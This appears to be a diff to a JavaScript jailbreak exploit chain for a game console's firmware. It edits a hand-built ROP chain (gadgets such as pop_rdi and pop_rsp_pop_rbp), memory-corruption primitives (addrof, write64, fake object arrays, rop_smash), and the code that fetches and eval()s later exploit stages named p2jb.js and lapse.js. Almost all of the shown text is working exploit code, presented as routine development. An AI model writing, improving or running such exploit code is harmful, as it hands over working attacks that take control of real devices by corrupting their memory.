@@ -515,10 +515,7 @@ class gadgets {
                 is_ps4 = true;
                 return; // Exit constructor, main() will check is_ps4 and return
             default:
-
                 throw new Error("App version not supported");
-
-
         }
     }
     get(gadget) {
@@ -1148,9 +1145,7 @@ function main () {
         function call_rop (address, rax = 0x0n, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
 
             write64(add_rop_smash_code_store, 0xab0025n);
-            real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n; // We only leak lower 32bits, stack seems always be at upper 32bits 0x7
-                                                                    // Value is tagged, remove 1n
-                                                                    // Seems offseted by 2 bytes
+            real_rbp = addrof(rop_smash(1)) + _cr_stack_offset;
 
             let i = 0;
 
@@ -1177,19 +1172,24 @@ function main () {
 
             // Store return value to fake_rop_return
             fake_rop[i++] = g.get('pop_rdi');
-            fake_rop[i++] = base_heap_add + fake_rop_return;
+            fake_rop[i++] = _cr_rop_return_addr;
             fake_rop[i++] = g.get('mov_qword_ptr_rdi_rax');
 
             // Return to JS
             fake_rop[i++] = g.get('pop_rax');
-            fake_rop[i++] = 0x2000n;                   // Fake value in RAX to make JS happy
+            fake_rop[i++] = 0x2000n;
             fake_rop[i++] = g.get('pop_rsp_pop_rbp');
             fake_rop[i++] = real_rbp;
 
             write64(add_rop_smash_code_store, 0xab00260325n);
-            fake_rw[59] = (fake_frame & 0xffffffffn); // Only 32 bits needed
-            rop_smash(fake_obj_arr[0]);               // Call ROP
+            fake_rw[59] = _cr_fake_frame_lo;
+            rop_smash(fake_obj_arr[0]);
         }
+
+        // Pre-computed constants for call_rop — avoids temp BigInt allocations on every call
+        const _cr_stack_offset    = 0x700000001n;  // 0x700000000n - 1n + 2n combined
+        const _cr_rop_return_addr = base_heap_add + fake_rop_return;
+        const _cr_fake_frame_lo   = fake_frame & 0xffffffffn;
 
         function call (address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
             call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
@@ -1555,6 +1555,8 @@ function main () {
 
         if (compare_version(FW_VERSION, "10.01") > 0) {
             // Trigger P2JB
+            logger.log("loading p2jb.js")
+
             let script = get_script("p2jb.js");
 
             if (script.trim().startsWith("<")) {
@@ -1564,18 +1566,8 @@ function main () {
                 return;
             }
 
-            let jbPromise = eval(script);
-
-            if (jbPromise && typeof jbPromise.then === 'function') {
-                jbPromise.then(() => {
-                    logger.flush();
-                }).catch((err) => {
-                    logger.log("Exploit failed: " + err);
-                    logger.flush();
-                });
-            } else {
-                logger.flush();
-            }
+            eval(script);
+            logger.flush();
         } else {
             // Trigger Lapse
             script = get_script("lapse.js");
@@ -1588,8 +1580,9 @@ function main () {
         }
 
         if (!is_jailbroken()) {
+            logger.log("Jailbreak didn't succeed. Reboot and Try again!");
             send_notification("Jailbreak didn't succeed. Reboot and Try again!");
-            throw new Error("Jailbreak didn't succeed");
+            // throw new Error("Jailbreak didn't succeed");
         }
 
 
